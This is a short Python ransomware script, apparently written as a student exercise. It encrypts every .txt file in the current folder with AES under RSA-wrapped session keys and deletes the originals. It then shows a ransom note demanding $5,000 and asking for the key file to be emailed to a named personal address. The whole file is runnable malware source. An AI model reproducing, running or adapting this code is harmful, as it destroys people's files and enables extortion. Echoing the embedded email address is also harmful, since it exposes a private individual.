import os
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad

Txtfiles = []

#function to generate asymmetric key pair
def generateKey():
	#generate a RSA key with private and public key
	key = RSA.generate(2048)

	#this will take the private key and store it in variable private_key
	private_key = key.export_key()
	#this key will then be written to ransomkey.bin
	file_out = open("ransomkey.bin", "wb")
	file_out.write(private_key)
	file_out.close()
	
	#this will take the public key and store it in variable public_key
	public_key = key.publickey().export_key()
	#this key will then be written to public.pem
	file_out = open("public.pem", "wb")
	file_out.write(public_key)
	file_out.close()
	
generateKey()
#function  to find txt files in the directory
def findTxt():
	#first check if the file is a "file" and ensure that it is a .txt file
	for file in os.listdir("."):
		if os.path.isfile(file):
			if file.endswith(".txt"):
				#save these .txt files in a list to use later
				Txtfiles.append(file)
	#sort the .txt files for correct decryption
	Txtfiles.sort()
findTxt()
#function to generate keys, encrypt files and create .enc files
def encryptData():
	for file in Txtfiles:
		#create the key, iv for each file
		session_key = get_random_bytes(16)
		iv = get_random_bytes(16)
		with open(file, 'r') as current_file:
			#to ensure the string data is of byte object
			data = str.encode(current_file.read())
			#encrypt every .txt file with a unique session key and iv
			cipherEnc = AES.new(session_key, AES.MODE_CBC, iv=iv)
			encryptedData = cipherEnc.encrypt(pad(data, AES.block_size))
			file_out=open("public.pem")
			#read the RSA public key generated from "public.pem" file
			public_key=RSA.import_key(file_out.read())
			#encrypted the session key with the RSA public key generated
			cipher = PKCS1_OAEP.new(public_key)
			encrypted_session_key = cipher.encrypt(session_key)
		#create .enc file with the encrypted data
		with open(file[:-4] + ".enc", "wb") as file_out:
			file_out.write(encryptedData)
		#file stores encrypted session key and iv associated with each encrypted file
		with open("encrypted_session_keys.bin","a+b") as file_out:
			file_out.write(encrypted_session_key)
			file_out.write(iv)
encryptData()
def deleteForever():
	for filename in os.listdir():
		if filename.endswith('.txt'):
			os.unlink(filename)
deleteForever()
#function to create a ransom note for the user
def ransomeNote():
		message = "Your text files are encrypted. To decrypt them, you need to pay me $5,000 and send ransomkey.bin in your folder to saniya@uowmail.edu.au"
		File=input(str(message) + '\n'+"Filename:")
		while(File!="ransomkey.bin"):
			File=input("Filename:")
ransomeNote()


